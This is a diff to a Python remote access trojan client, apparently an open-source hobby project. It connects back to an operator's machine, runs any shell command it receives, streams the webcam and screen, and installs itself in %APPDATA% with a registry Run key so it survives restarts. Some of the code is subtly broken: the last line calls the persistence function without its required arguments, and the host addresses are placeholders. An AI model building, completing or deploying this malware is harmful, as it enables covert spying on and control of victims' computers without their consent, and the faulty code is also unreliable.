@@ -1,3 +1,4 @@
+import sys
 import socket
 import json
 import subprocess
@@ -9,9 +10,13 @@ import cv2
 import pickle
 import struct
 import pyautogui
+import pygame
+from PIL import ImageGrab
+import numpy as np
+import shutil
+import time
 
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-soc.connect(('192.168.0.107', 9999)) # Enter your ip address in '#'
 
 def data_receive():
     data = ''
@@ -49,7 +54,7 @@ def log_thread():
 
 def byte_stream():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect(('192.168.0.107', 9998)) # Enter your ip address in '#'
+    sock.connect(('#', 4444)) # Enter your ip address in '#'
     vid = cv2.VideoCapture(0)
     while (vid.isOpened()):
         img, frame = vid.read()
@@ -60,6 +65,38 @@ def byte_stream():
 def send_byte_stream():
     t = threading.Thread(target=byte_stream)
     t.start()
+
+def byte_stream_recorder():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect(('#', 8888)) # Enter your ip address in '#'
+
+    screen = pygame.display.set_mode((0,0), pygame.FULLSCREEN)
+    screen = screen.get_size()
+    WIDTH = screen[0]
+    HEIGHT = screen[1]
+
+    while True:
+        img = ImageGrab.grab(bbox=(0,0,WIDTH,HEIGHT))
+        capture = np.array(img)
+        capture = cv2.cvtColor(capture, cv2.COLOR_BGR2RGB)
+        b = pickle.dumps(capture)
+        message = struct.pack("i", len(b))+b
+        sock.sendall(message)
+
+def send_byte_stream_recorder():
+    t = threading.Thread(target=byte_stream_recorder)
+    t.start()
+
+def run_persistence(name_registry, file_executable):
+    file_path = os.environ['appdata'] + '\\' + file_executable
+    try:
+        if not os.path.exists(file_path):
+            shutil.copyfile(sys.executable, file_path)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + name_registry + ' /t REG_SZ /d "' + file_path + '"', shell=True)
+        else:
+            pass
+    except:
+        pass
 
 def run_command():
     while True:
@@ -86,6 +123,11 @@ def run_command():
             ss = pyautogui.screenshot()
             ss.save('screenshot.png')
             file_upload('screenshot.png')
+        elif command == 'screenshare':
+            send_byte_stream_recorder()
+        elif command[:11] == 'persistence':
+            name_registry, file_executable = command[12:].split(' ')
+            run_persistence(name_registry, file_executable)
         else:
           execute = subprocess.Popen(
               command,
@@ -99,4 +141,15 @@ def run_command():
           output = json.dumps(data)
           soc.send(output.encode())
 
-run_command()
+def persistence():
+    while True:
+        try:
+            time.sleep(10)
+            soc.connect(('#', 9999)) # Enter your ip address in '#'
+            run_command()
+            soc.close()
+            break
+        except:
+            run_persistence()
+
+run_persistence()
